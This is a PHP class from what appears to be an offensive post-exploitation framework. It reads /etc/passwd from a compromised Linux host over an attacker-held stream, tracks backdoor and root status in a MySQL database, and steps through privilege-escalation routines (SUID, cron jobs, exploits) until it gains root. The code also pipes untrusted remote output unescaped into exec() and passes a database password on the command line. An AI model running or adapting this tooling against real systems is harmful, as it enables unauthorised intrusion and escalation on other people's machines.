<?php

class check4linux extends check4linux8jobs{
    
    
    
    
    
    
    
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
        $this->lan2init();
    }
  
    
    
    public function lan2init(){
        
        $this->titre(__FUNCTION__);
        
        echo "=============================================================================\n";
        $this->article("Template ID", $this->template_id);
        //$this->article("Template BASE64 ID", $this->templateB64_id);
        $this->article("Template CMD", $this->template_cmd);
        //$this->article("Template BASE64 CMD",$this->templateB64_cmd);
        $this->article("Template SHELL", $this->template_shell);
        //$this->article("Template BASE64 SHELL",$this->templateB64_shell);
        echo "=============================================================================\n";
        
        $data = "cat /etc/passwd ";
        $tmp = $this->lan2stream4result($data,$this->stream_timeout*2);
        $tmp2 = array();
        exec("echo '$tmp' | grep ':' ",$tmp2);
        $this->etc_passwd_str = $this->tab($tmp2);
        $this->etc_passwd_str = trim($this->etc_passwd_str);
        unset($tmp2);
        $this->env_path_str = $this->lan2env4path();
        $this->pause();
        
    }
    
    public function lan4root(){
        /*
         https://guide.offsecnewbie.com/privilege-escalation/linux-pe
         https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux
         https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
         */        
        $this->gtitre(__FUNCTION__);
        $sql = "update IP set ip2backdoor=0 where ip2backdoor=1 ;" ;
        $query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
        $this->requette($query);
        
        $sql = "update IP set ip2root=0 where ip2root=1 ;";
        $query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
        $this->requette($query);
        
        
        $query = str_replace("%CMD%", "id", $this->template_cmd);
        //$this->requette($query);
        
        $this->lan2start();
        $this->pause();
        
        if ( $this->uid_name==="root" ) {
            if (!$this->ip2backdoor8db($this->ip2id)) {
                $obj_root = new root4linux($this->eth, $this->domain, $this->ip, $this->port, $this->protocol, $this->stream, $this->templateB64_id, $this->templateB64_cmd, $this->templateB64_shell, $this->uid, $this->uid_name, $this->gid, $this->gid_name, $this->context, $this->uid_pass);
                $obj_root->lan4pentest();$this->pause();               
            }
        }
        else {
            if (!$this->ip2root8db($this->ip2id)) {$this->misc();$this->pause();}
            if (!$this->ip2root8db($this->ip2id)) {$this->users();$this->pause();}
            if (!$this->ip2root8db($this->ip2id)) {$this->exploits();$this->pause();}
            if (!$this->ip2root8db($this->ip2id)) {$this->suids();$this->pause();}
            if (!$this->ip2root8db($this->ip2id)) {$this->jobs();$this->pause();}
        }
        
        $this->rouge("Brief");
        $sql = "select uid_name,from_base64(templateB64_id),from_base64(templateB64_cmd),from_base64(templateB64_shell) FROM LAN where id8port=$this->port2id ;";

        $req = $this->mysql_ressource->query($sql);
        while ($row = $req->fetch_assoc()) {
            echo "\n";
            $this->article("Username", $row['uid_name']);
            $this->article("ID", $row['from_base64(templateB64_id)']);
            $this->article("CMD", $row['from_base64(templateB64_cmd)']);
            $this->article("SHELL", $row['from_base64(templateB64_shell)']);
            
        }
        $this->rouge("END of ".__FUNCTION__);
        $this->pause();
   }
    
      
    
}
?>
